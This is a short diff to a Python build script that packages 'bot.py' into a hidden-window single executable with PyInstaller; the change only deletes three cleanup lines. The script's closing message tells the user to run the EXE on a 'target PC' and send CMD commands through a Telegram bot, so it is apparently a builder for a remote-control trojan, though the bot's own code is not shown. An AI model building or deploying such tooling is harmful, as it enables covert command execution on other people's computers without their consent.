@@ -7,7 +7,4 @@ else:
 print('Building EXE file...')
 os.system(f'pyinstaller --icon {icon} -w --onefile bot.py')
 os.rename('dist/bot.exe', 'bot.exe')
-os.remove('dist')
-os.remove('build')
-os.remove('bot.build')
 print('Run bot.exe on target PC and send CMD commands to your telegram bot')
